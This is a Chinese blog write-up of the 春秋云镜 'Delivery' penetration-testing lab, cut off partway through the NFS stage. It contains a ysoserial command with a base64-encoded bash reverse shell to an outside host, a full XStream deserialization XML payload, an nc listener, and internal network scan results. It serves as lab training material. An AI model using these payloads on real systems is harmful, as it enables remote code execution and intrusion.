@@ -1,0 +1,366 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>春秋云镜Delivery | P4tt0n's b10g</title><meta name="author" content="P4tt0n"><meta name="copyright" content="P4tt0n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="春秋云镜Delivery开题：39.98.119.38 第一关 请测试 Delivery 暴露在公网上的 Web 应用的安全性，并尝试获取在该服务器上执行任意命令的能力。  fscan扫一下 [+] 端口开放 39.98.119.38:80[+] 端口开放 39.98.119.38:21[+] 端口开放 39.98.119.38:22[+] 端口开放 39.98.119.38:8080[*] 网站">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜Delivery">
+<meta property="og:url" content="https://p4tt0n.github.io/2025/04/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CDelivery/index.html">
+<meta property="og:site_name" content="P4tt0n's b10g">
+<meta property="og:description" content="春秋云镜Delivery开题：39.98.119.38 第一关 请测试 Delivery 暴露在公网上的 Web 应用的安全性，并尝试获取在该服务器上执行任意命令的能力。  fscan扫一下 [+] 端口开放 39.98.119.38:80[+] 端口开放 39.98.119.38:21[+] 端口开放 39.98.119.38:22[+] 端口开放 39.98.119.38:8080[*] 网站">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg">
+<meta property="article:published_time" content="2025-04-25T06:36:39.000Z">
+<meta property="article:modified_time" content="2025-04-25T06:37:41.567Z">
+<meta property="article:author" content="P4tt0n">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg"><link rel="shortcut icon" href="https://pic.imge.cc/2024/08/01/66ab32dd0cc03.png"><link rel="canonical" href="https://p4tt0n.github.io/2025/04/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CDelivery/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=4.14.0-b3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>(()=>{
+      const saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+      
+      window.btf = {
+        saveToLocal: saveToLocal,
+        getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+          script.src = url
+          script.async = true
+          script.onerror = reject
+          script.onload = script.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            script.onload = script.onreadystatechange = null
+            resolve()
+          }
+
+          Object.keys(attr).forEach(key => {
+            script.setAttribute(key, attr[key])
+          })
+
+          document.head.appendChild(script)
+        }),
+
+        getCSS: (url, id = false) => new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+          link.rel = 'stylesheet'
+          link.href = url
+          if (id) link.id = id
+          link.onerror = reject
+          link.onload = link.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            link.onload = link.onreadystatechange = null
+            resolve()
+          }
+          document.head.appendChild(link)
+        }),
+
+        addGlobalFn: (key, fn, name = false, parent = window) => {
+          const pjaxEnable = false
+          if (!pjaxEnable && key.startsWith('pjax')) return
+
+          const globalFn = parent.globalFn || {}
+          const keyObj = globalFn[key] || {}
+    
+          if (name && keyObj[name]) return
+    
+          name = name || Object.keys(keyObj).length
+          keyObj[name] = fn
+          globalFn[key] = keyObj
+          parent.globalFn = globalFn
+        }
+      }
+    
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+      
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })()</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '春秋云镜Delivery',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-04-25 14:37:41'
+}</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="./themes/butterfly/source/css/custom.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="./themes/butterfly/source/css/modify.css"><link rel="stylesheet" href="./themes/butterfly/source/css/transpancy.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', () => { preloader.initLoading() }, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', () => { preloader.endLoading() }, 'preloader_end')
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic2.zhimg.com/32098d0cc61d44d6151fb7614211d256_r.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="P4tt0n's b10g"><img class="site-icon" src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" alt="Logo"><span class="site-name">P4tt0n's b10g</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">春秋云镜Delivery</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-25T06:36:39.000Z" title="发表于 2025-04-25 14:36:39">2025-04-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-25T06:37:41.567Z" title="更新于 2025-04-25 14:37:41">2025-04-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>11分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="春秋云镜Delivery"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url('https://pic2.zhimg.com/32098d0cc61d44d6151fb7614211d256_r.jpg');"></div><article class="post-content" id="article-container"><h1 id="春秋云镜Delivery"><a href="#春秋云镜Delivery" class="headerlink" title="春秋云镜Delivery"></a>春秋云镜Delivery</h1><p>开题：39.98.119.38</p>
+<h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><blockquote>
+<p>请测试 Delivery 暴露在公网上的 Web 应用的安全性，并尝试获取在该服务器上执行任意命令的能力。</p>
+</blockquote>
+<p>fscan扫一下</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">[+] 端口开放 39.98.119.38:80</span><br><span class="line">[+] 端口开放 39.98.119.38:21</span><br><span class="line">[+] 端口开放 39.98.119.38:22</span><br><span class="line">[+] 端口开放 39.98.119.38:8080</span><br><span class="line">[*] 网站标题 http://39.98.119.38       状态码:200 长度:10918  标题:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[+] ftp 39.98.119.38:21:anonymous </span><br><span class="line">   [-&gt;]1.txt</span><br><span class="line">   [-&gt;]pom.xml</span><br><span class="line">[*] 网站标题 http://39.98.119.38:8080  状态码:200 长度:3655   标题:公司发货单</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>ftp匿名登录，下载pom.xml</p>
+<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ezjava<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>ezjava<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>ezjava<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.thoughtworks.xstream<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.16<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>访问8080</p>
+<p><img src="/2024/07/30/hello-world/image-20250406150209731.png" alt="image-20250406150209731"></p>
+<p>vps开放1099端口，然后yso起服务</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "bash -c {echo,YmFzaCAtaT4mIC9kZXYvdGNwLzguMTM0LjE0OS4yNC8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}"</span><br></pre></td></tr></tbody></table></figure>
+
+<p>监听2333端口</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>yakit发包</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">POST /just_sumbit_it HTTP/1.1</span><br><span class="line">Host: 39.98.119.38:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/xml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;java.util.PriorityQueue serialization='custom'&gt;</span><br><span class="line">    &lt;unserializable-parents/&gt;</span><br><span class="line">    &lt;java.util.PriorityQueue&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">            &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">        &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">            &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">            &lt;value class='com.sun.org.apache.xpath.internal.objects.XString'&gt;</span><br><span class="line">                &lt;m__obj class='string'&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content&lt;/m__obj&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">            &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">            &lt;value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'&gt;</span><br><span class="line">                &lt;message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'&gt;</span><br><span class="line">                    &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;</span><br><span class="line">                    &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;</span><br><span class="line">                    &lt;bodyParts/&gt;</span><br><span class="line">                    &lt;sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'&gt;</span><br><span class="line">                        &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;</span><br><span class="line">                        &lt;nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'&gt;</span><br><span class="line">                            &lt;aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'&gt;</span><br><span class="line">                                &lt;candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'&gt;</span><br><span class="line">                                    &lt;names&gt;</span><br><span class="line">                                        &lt;string&gt;aa&lt;/string&gt;</span><br><span class="line">                                        &lt;string&gt;aa&lt;/string&gt;</span><br><span class="line">                                    &lt;/names&gt;</span><br><span class="line">                                    &lt;ctx&gt;</span><br><span class="line">                                        &lt;environment/&gt;</span><br><span class="line">                                        &lt;registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'&gt;</span><br><span class="line">                                            &lt;java.rmi.server.RemoteObject&gt;</span><br><span class="line">                                                &lt;string&gt;UnicastRef&lt;/string&gt;</span><br><span class="line">                                                &lt;string&gt;8.134.149.24&lt;/string&gt;</span><br><span class="line">                                                &lt;int&gt;1099&lt;/int&gt;</span><br><span class="line">                                                &lt;long&gt;0&lt;/long&gt;</span><br><span class="line">                                                &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">                                                &lt;long&gt;0&lt;/long&gt;</span><br><span class="line">                                                &lt;short&gt;0&lt;/short&gt;</span><br><span class="line">                                                &lt;boolean&gt;false&lt;/boolean&gt;</span><br><span class="line">                                            &lt;/java.rmi.server.RemoteObject&gt;</span><br><span class="line">                                        &lt;/registry&gt;</span><br><span class="line">                                        &lt;host&gt;8.134.149.24&lt;/host&gt;</span><br><span class="line">                                        &lt;port&gt;1099&lt;/port&gt;</span><br><span class="line">                                    &lt;/ctx&gt;</span><br><span class="line">                                &lt;/candidates&gt;</span><br><span class="line">                            &lt;/aliases&gt;</span><br><span class="line">                        &lt;/nullIter&gt;</span><br><span class="line">                    &lt;/sm&gt;</span><br><span class="line">                &lt;/message&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>直接拿下root</p>
+<p><img src="/2024/07/30/hello-world/image-20250406151442817.png" alt="image-20250406151442817"></p>
+<p><img src="/2024/07/30/hello-world/image-20250406151734663.png" alt="image-20250406151734663"></p>
+<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><blockquote>
+<p>为了实现跨机器和跨操作系统的文件共享，管理员在内网部署了 NFS，然而这个决策却使得该服务器陷入了潜在的安全风险。你的任务是尝试获取该服务器的控制权，以评估安全性。</p>
+</blockquote>
+<p><img src="/2024/07/30/hello-world/image-20250417202446460.png" alt="image-20250417202446460"></p>
+<p>搭代理，扫内网</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">[+] 端口开放 172.22.13.57:80</span><br><span class="line">[+] 端口开放 172.22.13.57:22</span><br><span class="line">[+] 端口开放 172.22.13.14:80</span><br><span class="line">[+] 端口开放 172.22.13.14:22</span><br><span class="line">[+] 端口开放 172.22.13.14:21</span><br><span class="line">[+] 端口开放 172.22.13.28:80</span><br><span class="line">[+] 端口开放 172.22.13.6:88</span><br><span class="line">[+] 端口开放 172.22.13.28:3306</span><br><span class="line">[+] 端口开放 172.22.13.6:445</span><br><span class="line">[+] 端口开放 172.22.13.28:445</span><br><span class="line">[+] 端口开放 172.22.13.28:139</span><br><span class="line">[+] 端口开放 172.22.13.6:139</span><br><span class="line">[+] 端口开放 172.22.13.28:135</span><br><span class="line">[+] 端口开放 172.22.13.6:135</span><br><span class="line">[+] 端口开放 172.22.13.28:8000</span><br><span class="line">[+] 端口开放 172.22.13.14:8080</span><br><span class="line">[*] NetBios 172.22.13.6     [+] DC:XIAORANG\WIN-DC         </span><br><span class="line">[*] 网站标题 http://172.22.13.57       状态码:200 长度:4833   标题:Welcome to CentOS</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*] 172.22.13.28</span><br><span class="line">   [-&gt;] WIN-HAUWOLAO</span><br><span class="line">   [-&gt;] 172.22.13.28</span><br><span class="line">[*] 网站标题 http://172.22.13.28       状态码:200 长度:2525   标题:欢迎登录OA办公平台</span><br><span class="line">[*] 网站标题 http://172.22.13.14       状态码:200 长度:10918  标题:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*] 172.22.13.6</span><br><span class="line">   [-&gt;] WIN-DC</span><br><span class="line">   [-&gt;] 172.22.13.6</span><br><span class="line">[*] 网站标题 http://172.22.13.28:8000  状态码:200 长度:170    标题:Nothing Here.</span><br><span class="line">[*] 网站标题 http://172.22.13.14:8080  状态码:200 长度:3655   标题:公司发货单</span><br><span class="line">[+] ftp 172.22.13.14:21:anonymous </span><br><span class="line">   [-&gt;]1.txt</span><br><span class="line">   [-&gt;]pom.xml</span><br><span class="line">[*] NetBios 172.22.13.28    WIN-HAUWOLAO.xiaorang.lab           Windows Server 2016 Datacenter 14393</span><br><span class="line">[+] MySQL 172.22.13.28:3306:root 123456</span><br></pre></td></tr></tbody></table></figure>
+
+<p>整理一下</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">172.22.13.14 本机</span><br><span class="line">172.22.13.57 CentOS</span><br><span class="line">172.22.13.28 OA系统、mysql弱口令root/123456</span><br><span class="line">172.22.13.6  WIN-DC DC域 </span><br></pre></td></tr></tbody></table></figure>
+
+<p>看提示是要打nfs，那再扫一下2049端口</p>
+<p><img src="/2024/07/30/hello-world/image-20250417203157707.png" alt="image-20250417203157707"></p>
+<p>选择先ssh到外网主机,然后下载一个mount,在挂载到外网主机,写ssh公钥给joyce用户<a target="_blank" rel="noopener" href="https://gist.github.com/zkryakgul/bb561235b7f36c57d15a015d20c7e336">nfs-common offline installer for ubuntu 20.04.5 LTS · GitHub</a></p>
+<p>靶机上创建run.sh</p>
